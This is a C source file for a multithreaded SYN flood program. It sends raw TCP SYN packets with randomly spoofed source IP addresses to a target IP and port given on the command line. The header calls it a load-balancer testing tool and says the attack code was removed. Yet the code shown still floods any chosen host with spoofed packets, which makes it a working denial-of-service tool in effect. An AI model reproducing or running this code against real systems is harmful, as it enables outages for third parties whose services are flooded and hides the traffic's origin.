/********************************************************************************************
* SYN Flood, Test on CentOS 6.4 , gcc (GCC) 4.4.7  
* gcc -Wall -lpthread synf.c -o synf 
* change log:
* 	2006-12-01, code by yunshu(wustyunshu@hotmail.com), thx luoluo for fixing a bug.
* 	2006-12-05, yunshu fix a bug, version 1.0
* 	2006-12-26, thx bocai for reporting a bug, version 1.1
* 	2008-04-26 luoluo add type options to support syn_ack and fin_ack flood v1.2
*	2010-11-10 yunshu fix a little bug
*	2010-11-19 yunshu modify the sleep funtion, version 1.3.
*	2011-06-26 yunshu delete attack code, make it to be a testing tool.
*	2015-01-20 cookies add multithread and optimize the code.
*it used to test loadblance, you have to change some code for attacking. 
*********************************************************************************************/
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
	
typedef struct ip_hdr{
	unsigned char       h_verlen;
	unsigned char       tos;
	unsigned short      total_len;
	unsigned short      ident;
	unsigned short      frag_and_flags;
	unsigned char       ttl;
	unsigned char       proto;
	unsigned short      checksum;
	unsigned int        sourceIP;
	unsigned int        destIP;
}IP_HEADER;
	
typedef struct tcp_hdr{
	unsigned short      sport;
	unsigned short      dport;
	unsigned int        seq;
	unsigned int        ack;
	unsigned char       lenres;
	unsigned char       flag;
	unsigned short      win;
	unsigned short      sum;
	unsigned short      urp;
}TCP_HEADER;
	
typedef struct tsd_hdr{
	unsigned int	    saddr;
	unsigned int 	    daddr;
	char                mbz;
	char                ptcl;
	unsigned short      tcpl;
}PSD_HEADER;

typedef struct ip_tcp{ 
	struct ip_hdr           IpHeader;
	struct tcp_hdr          TcpHeader;
}TP_TCP;

typedef struct pack{
	struct ip_tcp            Iptcp; 
	struct tsd_hdr           PsdHeader;
}PACKET;

	
#define PACKET_SIZE     sizeof(IP_HEADER) + sizeof( TCP_HEADER )
	
char    		dst_ip[20] = { 0 };
int     		dst_port;
unsigned long long 	sleeptime, starttime, outcount=0;
int 			pkt_then_sleep = 0, pkt_sum = 0, th_count= 1;
struct  sockaddr_in     sa;

	
unsigned short CheckSum(unsigned short * buffer, int size)
{
	unsigned long   cksum = 0;
	
	while (size > 1)
	{
		cksum += *buffer++;
	       	size -= sizeof(unsigned short);
	}
	if (size)
	{
		cksum += *(unsigned char *) buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);

	return (unsigned short) (~cksum);
}
	
void MySleep(unsigned int micro_second)
{
	struct timeval  t_timeval;
	
	t_timeval.tv_sec = 0;
	t_timeval.tv_usec = micro_second;
	
	select( 0, NULL, NULL, NULL, &t_timeval );
}
	
void Init(int sock , PACKET * packet ){
	
	packet->Iptcp.IpHeader.sourceIP = rand();
	packet->Iptcp.IpHeader.checksum = CheckSum( (unsigned short *) packet, sizeof(IP_HEADER) );

	packet->Iptcp.TcpHeader.sport = htons( rand()%16383 + 49152 );
	packet->Iptcp.TcpHeader.seq = htonl( rand()%90000000 + 2345 );
	packet->PsdHeader.saddr = packet->Iptcp.IpHeader.sourceIP;
	packet->Iptcp.TcpHeader.sum = CheckSum( (unsigned short *) &packet->Iptcp.TcpHeader, sizeof(PSD_HEADER) + sizeof(TCP_HEADER) );

	//struct in_addr sip;
	//memcpy(&sip,&packet->Iptcp.IpHeader.sourceIP,4);
	//printf("%s\t%d\n",inet_ntoa(sip),ntohs(packet->Iptcp.TcpHeader.sport));

	sendto( sock, (char *)packet, PACKET_SIZE, 0, (struct sockaddr *)(&sa), sizeof(struct sockaddr_in));

	packet->Iptcp.TcpHeader.sum = 0;
	packet->Iptcp.IpHeader.checksum = 0;

	outcount--;
}
	
void *flood(void *arg){

//packet h_verlen,tos,total_len,ident,frag_and_flags,ttl,proto,checksum,sourceIP,destIP,sport,dport,seq,ack,lenres,flag,win,sum,urp,saddr,daddr,mbz,ptcl,tcpl
	PACKET packet = {{{(4<<4 | sizeof(struct ip_hdr)/sizeof(unsigned int)),0,htons(sizeof(struct ip_tcp)),1,0x40,255,IPPROTO_TCP,0,0,inet_addr(dst_ip)},\
	               {0,htons(dst_port),0,0,(sizeof(TCP_HEADER)/4<<4|0),0x02,htons(512),0,0}},\
	               {0,inet_addr(dst_ip),0,IPPROTO_TCP,htons(sizeof(TCP_HEADER))}};

	int     sock;
	int     flag = 1;

	if ( ( sock = socket(PF_INET,SOCK_RAW,6) ) < 1 ){
		printf( "create socket error...%s\n", strerror(errno) );
		exit (-1);
	}
	
	if( setsockopt( sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) < 0 ){
		printf("setsockopt error...%d\n", errno);
		exit (-1);
	}
	
	
	srand((unsigned) time(NULL));

	printf("thread tid is %u started,from %llu\n",(unsigned)pthread_self(),outcount);

	int     number = 0;
	if( sleeptime == 0 )
	{
		printf("sleep time is 0\n");
		while( (signed)outcount > 0 ){
			//printf("current thread tid is %u,%lld\n",(unsigned)pthread_self(),outcount);
			Init( sock, &packet );
		}
	}
	else
	{
		while( (signed)outcount > 0 )
		{
			Init( sock, &packet );

			number ++;
			if( number == pkt_then_sleep )
	           	{
				MySleep( sleeptime );
				number = 0;
	           	}
	      	}
	}
	return NULL;
}
	
void sig_proc(int signum)
{
	int ctime = 0;
	
	printf( "signal: %d\n", signum );
	
	ctime=time(NULL);
	
	printf("\n -- statistics -----------------------\n");
	printf("   packets sent:          %llu\n",pkt_sum-outcount);
	printf("   seconds active:        %llu\n",ctime-starttime);
	printf("   average packet/second: %llu\n",(pkt_sum-outcount)/(ctime-starttime));
	printf(" -------------------------------------\n");
	exit(1);
}
	
int main(int argc,char *argv[])
{
	if( argc != 7 )
	{
		fprintf(stderr,"\n%s <target ip> <target port> <pkt_then_sleep> <sleep_time> <pkt_sum> <thread_sum>\n", argv[0]);
		fprintf(stderr, "send syn packets to <target ip>:<target port>, sleep <sleep_time> microseconds per <pkt_then_sleep> packets,send sum <pkt_sum>,use <thread_sum> thread\n\n");
	       	return -1;
	}
	strncpy( dst_ip, argv[1], 16 );
	dst_port = atoi( argv[2] );
	pkt_then_sleep = atoi(argv[3]);
	if( !(pkt_sum = outcount = atoi(argv[5])) ){
		printf( "sum packet is 0 error.\n" );
		return -1;
	}

	if( inet_addr(dst_ip) == INADDR_NONE )
	{      
		printf( "target ip error.\n" );
		return -1;
	}
	
	if( dst_port < 0 || dst_port > 65535 )
	{      
		printf( "port error.\n" );
		return -1;
	}
	
	if( pkt_then_sleep <= 0 )
	{
		printf( "pkt_then_sleep error.\n" );
	 	return -1;
	} 

	memset( &sa, 0, sizeof(struct  sockaddr_in) );
	sa.sin_family = AF_INET;
	sa.sin_port = htons(dst_port);
	sa.sin_addr.s_addr = inet_addr(dst_ip);

	sleeptime = atoi(argv[4]);
	starttime = time(NULL);
	while( (unsigned)time(NULL) == starttime) usleep(1000);
	
	signal(SIGHUP,&sig_proc);
	signal(SIGINT,&sig_proc);
	signal(SIGQUIT,&sig_proc);
	signal(SIGILL,&sig_proc);
	signal(SIGABRT,&sig_proc);
	signal(SIGFPE,&sig_proc);
	signal(SIGSEGV,&sig_proc);
	signal(SIGPIPE,&sig_proc);
	signal(SIGALRM,&sig_proc);
	signal(SIGTERM,&sig_proc);
	signal(SIGUSR1,&sig_proc);
	signal(SIGUSR2,&sig_proc);
	signal(SIGCHLD,&sig_proc);
	signal(SIGCONT,&sig_proc);
	signal(SIGTSTP,&sig_proc);
	signal(SIGTTIN,&sig_proc);
	signal(SIGTTOU,&sig_proc);
	
	int tnum =1; 
	if( !(tnum = th_count = atoi(argv[6])) ){
		printf( "thread count is 0 error.\n" );
		return -1;
	}
	pthread_t thread[th_count];

	while(tnum){
		pthread_create(&thread[--tnum],NULL,flood,NULL);
//		printf("%d\t%d\n",th_count,thread[th_count]);
	}	

	tnum = th_count;

	while(tnum){
		pthread_join(thread[--tnum],NULL);
	}

	//flood(NULL);

	//printf("main thread id is %u\n",(unsigned)pthread_self());  
	sig_proc(0);

	return 0;
}

